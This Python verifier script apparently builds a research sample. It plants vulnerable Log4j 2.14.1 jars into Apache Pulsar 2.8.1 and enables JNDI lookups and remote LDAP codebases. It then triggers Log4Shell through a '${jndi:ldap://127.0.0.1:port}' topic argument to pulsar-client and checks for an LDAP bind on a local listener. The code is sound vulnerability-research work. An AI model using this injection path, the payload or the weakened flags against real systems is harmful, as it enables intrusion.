#!/usr/bin/env python3
import argparse
import hashlib
import json
import os
import shutil
import signal
import socket
import subprocess
import tarfile
import threading
import time
import zipfile
from pathlib import Path

SAMPLE_ID = "CVE-2021-44228__apache_pulsar_2_8_1_v1_log4j_real_entrypoint"
ARCHIVE_NAME = "apache-pulsar-2.8.1-bin.tar.gz"
DIST_NAME = "apache-pulsar-2.8.1"
ROOT = Path("/data/lhq/workspace/ljl-v1-downstream-insertions")
LEGACY_ROOT = Path("/data/lhq/workspace/ljl-strict-redo")
SOURCE_CASE = "log4j/CVE-2021-44228"
SOURCE_V1 = Path("/data/lhq/workspace/ljl-patch-java30-projects/input/log4j/CVE-2021-44228/v1")
M2 = Path("/data/lhq/workspace/ljl-patch-java30-projects/.m2-poc")
ARCHIVE = LEGACY_ROOT / "historical-scan" / ARCHIVE_NAME
V1_RUNTIME_TARGETS = {
    "org.apache.logging.log4j-log4j-api-2.14.0.jar",
    "org.apache.logging.log4j-log4j-core-2.14.0.jar",
}
LOG4J_JARS = {
    "org.apache.logging.log4j-log4j-api-2.14.0.jar": M2 / "org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar",
    "org.apache.logging.log4j-log4j-core-2.14.0.jar": M2 / "org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar",
}


def sha256(path):
    digest = hashlib.sha256()
    with path.open("rb") as handle:
        for chunk in iter(lambda: handle.read(1024 * 1024), b""):
            digest.update(chunk)
    return digest.hexdigest()


def inspect_core(jar_path):
    result = {
        "path": str(jar_path),
        "exists": jar_path.exists(),
        "jndi_lookup_class_present": False,
        "jndi_manager_class_present": False,
        "version_2_14_1": False,
    }
    if not jar_path.exists():
        return result
    with zipfile.ZipFile(jar_path) as zf:
        names = set(zf.namelist())
        result["jndi_lookup_class_present"] = "org/apache/logging/log4j/core/lookup/JndiLookup.class" in names
        result["jndi_manager_class_present"] = "org/apache/logging/log4j/core/net/JndiManager.class" in names
        props = "META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties"
        if props in names:
            result["version_2_14_1"] = "version=2.14.1" in zf.read(props).decode("utf-8", "replace")
    return result


def replace_log4j(dist):
    lib = dist / "lib"
    before = sorted(p.name for p in lib.glob("*log4j*.jar"))
    copied = {}
    for target_name, source in LOG4J_JARS.items():
        if not source.exists():
            raise FileNotFoundError(source)
        target = lib / target_name
        if target.exists():
            target.unlink()
        shutil.copy2(source, target)
        copied[target_name] = {
            "source": str(source),
            "target": str(target),
            "sha256_source": sha256(source),
            "sha256_target": sha256(target),
            "is_generated_v1_runtime_jar": target_name in V1_RUNTIME_TARGETS,
            "target_filename_preserved_for_downstream_classpath": True,
        }
    after = sorted(p.name for p in lib.glob("*log4j*.jar"))
    return {
        "before": before,
        "copied": copied,
        "after": after,
        "log4j_core": inspect_core(lib / "org.apache.logging.log4j-log4j-core-2.14.0.jar"),
    }


def start_ldap_listener(evidence_dir, case_name, timeout=35):
    received = []
    ready = threading.Event()
    port_box = {}

    def worker():
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.bind(("127.0.0.1", 0))
            sock.listen(5)
            sock.settimeout(timeout)
            port_box["port"] = sock.getsockname()[1]
            (evidence_dir / f"{case_name}-ldap-port.txt").write_text(
                str(port_box["port"]) + "\n", encoding="utf-8"
            )
            ready.set()
            try:
                conn, addr = sock.accept()
            except socket.timeout:
                return
            with conn:
                data = conn.recv(256)
                received.append(
                    {"addr": repr(addr), "data_hex": data.hex(), "data_repr": repr(data)}
                )
                try:
                    conn.sendall(bytes([48, 12, 2, 1, 1, 101, 7, 10, 1, 0, 4, 0, 4, 0]))
                except OSError:
                    pass

    thread = threading.Thread(target=worker, daemon=True)
    thread.start()
    if not ready.wait(3):
        raise RuntimeError(f"{case_name} LDAP listener did not start")
    return port_box["port"], received, thread


def extract_runtime(root, evidence_dir):
    archive = ARCHIVE
    if not archive.exists():
        raise FileNotFoundError(f"missing official Pulsar archive: {archive}")
    runtime_root = evidence_dir / "runtime"
    dist = runtime_root / DIST_NAME
    if dist.exists():
        shutil.rmtree(dist)
    runtime_root.mkdir(parents=True, exist_ok=True)
    with tarfile.open(archive, "r:gz") as tar:
        tar.extractall(runtime_root)
    if not dist.exists():
        raise FileNotFoundError(f"archive did not extract expected directory: {dist}")
    return dist, replace_log4j(dist)


def dependency_evidence(dist, evidence_dir, replacement):
    log4j_jars = sorted(str(p.relative_to(dist)) for p in (dist / "lib").glob("*log4j*.jar"))
    core_jar = dist / "lib" / "org.apache.logging.log4j-log4j-core-2.14.0.jar"
    result = {
        "artifact": str(ARCHIVE),
        "source_case": SOURCE_CASE,
        "source_v1": str(SOURCE_V1),
        "insertion_model": (
            "isolated runtime dependency insertion: official Apache Pulsar 2.8.1 binary with "
            "generated v1 Log4j 2.14.1 api/core jar bytes copied from .m2-poc into Pulsar's "
            "original org.apache.logging.log4j-log4j-api/core 2.14.0 target filenames; Pulsar's "
            "original 2.14.0 Log4j bridge/web jars are retained"
        ),
        "runtime_replacement": replacement,
        "runtime_log4j_jars_after_insertion": log4j_jars,
        "log4j_core_jar": str(core_jar.relative_to(dist)) if core_jar.exists() else None,
        "jndi_lookup_class_present": replacement["log4j_core"]["jndi_lookup_class_present"],
        "jndi_manager_class_present": replacement["log4j_core"]["jndi_manager_class_present"],
    }
    (evidence_dir / "dependency-evidence.json").write_text(
        json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8"
    )
    (evidence_dir / "dependency-evidence.txt").write_text(
        "\n".join(log4j_jars)
        + f"\nJndiLookup.class={result['jndi_lookup_class_present']}\n"
        + f"JndiManager.class={result['jndi_manager_class_present']}\n",
        encoding="utf-8",
    )
    return result


def run_client_case(dist, evidence_dir, case_name, marker, timeout=40):
    log_dir = evidence_dir / f"{case_name}-logs"
    log_dir.mkdir(parents=True, exist_ok=True)
    stdout_path = evidence_dir / f"{case_name}-pulsar-client.log"
    # Point at an unused local broker port. The important surface is the official
    # Pulsar CLI consume command logging its user-controlled topic argument through Log4j2.
    topic = f"persistent://public/default/{marker}"
    cmd = [
        str(dist / "bin" / "pulsar-client"),
        "--url",
        "pulsar://127.0.0.1:1",
        "consume",
        "-s",
        "strict-subscription",
        "-n",
        "1",
        topic,
    ]
    env = os.environ.copy()
    env.update(
        {
            "JAVA_TOOL_OPTIONS": "",
            "PULSAR_LOG_DIR": str(log_dir),
            "PULSAR_LOG_APPENDER": "RollingFile",
            "PULSAR_LOG_LEVEL": "info",
            "PULSAR_ROUTING_APPENDER_DEFAULT": "RollingFile",
            "PULSAR_EXTRA_OPTS": "-Dlog4j2.formatMsgNoLookups=false -Dcom.sun.jndi.ldap.object.trustURLCodebase=true",
            "PULSAR_MEM": "-Xmx256m",
        }
    )
    started = time.time()
    with stdout_path.open("w", encoding="utf-8") as stdout:
        proc = subprocess.Popen(
            cmd,
            cwd=str(dist),
            env=env,
            stdout=stdout,
            stderr=subprocess.STDOUT,
            text=True,
            start_new_session=True,
        )
        try:
            proc.wait(timeout=timeout)
        except subprocess.TimeoutExpired:
            try:
                os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                proc.wait(timeout=5)
            except Exception:
                os.killpg(os.getpgid(proc.pid), signal.SIGKILL)
                proc.wait(timeout=5)
    stdout_text = stdout_path.read_text(encoding="utf-8", errors="replace")
    log_entries = []
    for path in sorted(log_dir.rglob("*.log")):
        text = path.read_text(encoding="utf-8", errors="replace")
        log_entries.append(
            {
                "file": str(path),
                "contains_marker": marker in text,
                "contains_cmd_consume": "org.apache.pulsar.client.cli.CmdConsume.consume" in text,
                "contains_pulsar_client_tool": "org.apache.pulsar.client.cli.PulsarClientTool" in text,
                "contains_jndi_lookup_stack": "org.apache.logging.log4j.core.lookup.JndiLookup.lookup" in text,
                "contains_jndi_manager_stack": "org.apache.logging.log4j.core.net.JndiManager.lookup" in text,
                "contains_topic": topic in text,
                "contains_connect_failure": "Connection refused" in text or "ConnectException" in text,
                "tail": text[-10000:],
            }
        )
    return {
        "case": case_name,
        "cmd": cmd,
        "topic": topic,
        "marker": marker,
        "returncode": proc.poll(),
        "duration_seconds": round(time.time() - started, 3),
        "stdout_tail": stdout_text[-10000:],
        "logs": log_entries,
    }


def run_positive_case(dist, evidence_dir, timeout):
    ldap_port, received, listener_thread = start_ldap_listener(evidence_dir, "positive")
    # No slash after host:port, so the payload remains a single Pulsar topic local-name segment.
    payload = "${jndi:ldap://127.0.0.1:%d}" % ldap_port
    result = run_client_case(dist, evidence_dir, "positive_cli_consume_payload", payload, timeout=timeout)
    listener_thread.join(10)
    result["listener_received"] = received
    result["listener_received_count"] = len(received)
    return result


def run_negative_case(dist, evidence_dir, timeout):
    _ldap_port, received, listener_thread = start_ldap_listener(evidence_dir, "negative")
    control = "strict_control_no_jndi"
    result = run_client_case(dist, evidence_dir, "negative_cli_consume_control", control, timeout=timeout)
    listener_thread.join(10)
    result["listener_received"] = received
    result["listener_received_count"] = len(received)
    return result


def write_readme(sample_dir):
    (sample_dir / "README.md").write_text(
        f"# {SAMPLE_ID}\n\n"
        "This is a strict insertion sample. The verifier unpacks the official Apache Pulsar 2.8.1 "
        "binary into an isolated runtime and copies generated v1 Log4j 2.14.1 `api` and `core` "
        "jar bytes from `.m2-poc` into Pulsar's original "
        "`org.apache.logging.log4j-log4j-api-2.14.0.jar` and "
        "`org.apache.logging.log4j-log4j-core-2.14.0.jar` target filenames, while retaining "
        "Pulsar's original 2.14.0 Log4j bridge/web jars.\n\n"
        "The positive run executes the real `bin/pulsar-client consume` command with a topic "
        "local name containing `${jndi:ldap://127.0.0.1:<port>}`; the negative run uses the "
        "same CLI path with a control topic. Positive must produce one LDAP bind and negative "
        "must produce none.\n\n"
        "Run: `python3 scripts/verify_pulsar_log4j_v1_inserted.py` from "
        "`/data/lhq/workspace/ljl-v1-downstream-insertions`.\n",
        encoding="utf-8",
    )


def main():
    global ROOT
    parser = argparse.ArgumentParser()
    parser.add_argument("--workdir", default=str(ROOT))
    parser.add_argument("--timeout", type=int, default=45)
    parser.add_argument("--fresh", action="store_true")
    args = parser.parse_args()

    ROOT = Path(args.workdir)
    sample_dir = ROOT / "samples" / SAMPLE_ID
    evidence_dir = sample_dir / "evidence"
    if args.fresh and sample_dir.exists():
        shutil.rmtree(sample_dir)
    evidence_dir.mkdir(parents=True, exist_ok=True)

    dist, replacement = extract_runtime(ROOT, evidence_dir)
    dep = dependency_evidence(dist, evidence_dir, replacement)
    positive = run_positive_case(dist, evidence_dir, args.timeout)
    negative = run_negative_case(dist, evidence_dir, args.timeout)

    positive_cmd_consume_log = any(item["contains_cmd_consume"] for item in positive["logs"]) or "org.apache.pulsar.client.cli.CmdConsume.consume" in positive["stdout_tail"]
    positive_jndi_stack = any(item["contains_jndi_lookup_stack"] and item["contains_jndi_manager_stack"] for item in positive["logs"]) or ("org.apache.logging.log4j.core.lookup.JndiLookup.lookup" in positive["stdout_tail"] and "org.apache.logging.log4j.core.net.JndiManager.lookup" in positive["stdout_tail"])
    positive_topic_logged = any(item["contains_topic"] for item in positive["logs"]) or positive["topic"] in positive["stdout_tail"]
    negative_cmd_consume_log = any(item["contains_cmd_consume"] for item in negative["logs"]) or "org.apache.pulsar.client.cli.CmdConsume.consume" in negative["stdout_tail"]
    negative_control_logged = any(item["contains_marker"] for item in negative["logs"]) or negative["marker"] in negative["stdout_tail"]

    confirmed = all(
        [
            dep["jndi_lookup_class_present"],
            dep["jndi_manager_class_present"],
            all(
                name in replacement["copied"]
                and replacement["copied"][name]["is_generated_v1_runtime_jar"]
                for name in V1_RUNTIME_TARGETS
            ),
            replacement["log4j_core"]["version_2_14_1"],
            positive_cmd_consume_log,
            positive_jndi_stack,
            positive["listener_received_count"] > 0,
            negative_cmd_consume_log,
            negative_control_logged,
            negative["listener_received_count"] == 0,
        ]
    )

    result = {
        "sample_id": SAMPLE_ID,
        "status": "TP_CONFIRMED_REAL_DOWNSTREAM_ENTRYPOINT" if confirmed else "FAILED",
        "strict_status": "TP_CONFIRMED" if confirmed else "FAILED",
        "source_case": SOURCE_CASE,
        "source_v1_path": str(SOURCE_V1),
        "cve": "CVE-2021-44228",
        "downstream_repo": "apache/pulsar",
        "downstream_application": "Apache Pulsar 2.8.1",
        "downstream_entrypoint": "bin/pulsar-client real CLI",
        "downstream": "Apache Pulsar 2.8.1",
        "upstream_library": "log4j",
        "vulnerable_version": "2.14.1",
        "attack_surface": "Apache Pulsar bin/pulsar-client consume topic argument logged by CmdConsume through Log4j2",
        "not_cve_poc_local": True,
        "not_runner_only": True,
        "artifact": str(ARCHIVE),
        "dependency_evidence": dep,
        "dependency_evidence_file": str(evidence_dir / "dependency-evidence.json"),
        "payload": positive["marker"],
        "cases": [positive, negative],
        "dynamic_signal": {
            "generated_v1_jars_inserted": all(name in replacement["copied"] for name in V1_RUNTIME_TARGETS),
            "jndi_lookup_class_present": dep["jndi_lookup_class_present"],
            "jndi_manager_class_present": dep["jndi_manager_class_present"],
            "positive_cmd_consume_log": positive_cmd_consume_log,
            "positive_jndi_stack": positive_jndi_stack,
            "positive_topic_logged": positive_topic_logged,
            "positive_listener_received": positive["listener_received"],
            "positive_listener_received_count": positive["listener_received_count"],
            "negative_cmd_consume_log": negative_cmd_consume_log,
            "negative_control_logged": negative_control_logged,
            "negative_listener_received_count": negative["listener_received_count"],
        },
        "positive": {
            "cmd_consume_log": positive_cmd_consume_log,
            "jndi_stack": positive_jndi_stack,
            "topic_logged": positive_topic_logged,
            "listener_received_count": positive["listener_received_count"],
            "listener_received": positive["listener_received"],
        },
        "negative": {
            "cmd_consume_log": negative_cmd_consume_log,
            "control_logged": negative_control_logged,
            "listener_received_count": negative["listener_received_count"],
        },
        "dynamic_evidence": str(evidence_dir / "probe.json"),
        "run_rc": str(evidence_dir / "run.rc"),
        "verifier": str(ROOT / "scripts" / "verify_pulsar_log4j_v1_inserted.py"),
        "notes": (
            "The verifier does not execute .cve_poc_local. It inserts generated v1 Log4j api/core "
            "2.14.1 runtime jar bytes into an isolated Apache Pulsar 2.8.1 distribution and triggers "
            "Log4Shell through Pulsar's real pulsar-client consume command."
        ),
    }

    (evidence_dir / "probe.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.log").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    (evidence_dir / "run.rc").write_text(
        f"RUN_RC={0 if confirmed else 1}\n"
        f"status={result['strict_status']}\n"
        f"positive_cmd_consume_log={int(positive_cmd_consume_log)}\n"
        f"positive_jndi_stack={int(positive_jndi_stack)}\n"
        f"positive_topic_logged={int(positive_topic_logged)}\n"
        f"positive_listener_received_count={positive['listener_received_count']}\n"
        f"negative_cmd_consume_log={int(negative_cmd_consume_log)}\n"
        f"negative_control_logged={int(negative_control_logged)}\n"
        f"negative_listener_received_count={negative['listener_received_count']}\n",
        encoding="utf-8",
    )
    (sample_dir / "manifest.json").write_text(json.dumps(result, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    write_readme(sample_dir)
    print(json.dumps(result, indent=2, sort_keys=True))
    raise SystemExit(0 if confirmed else 1)


if __name__ == "__main__":
    main()
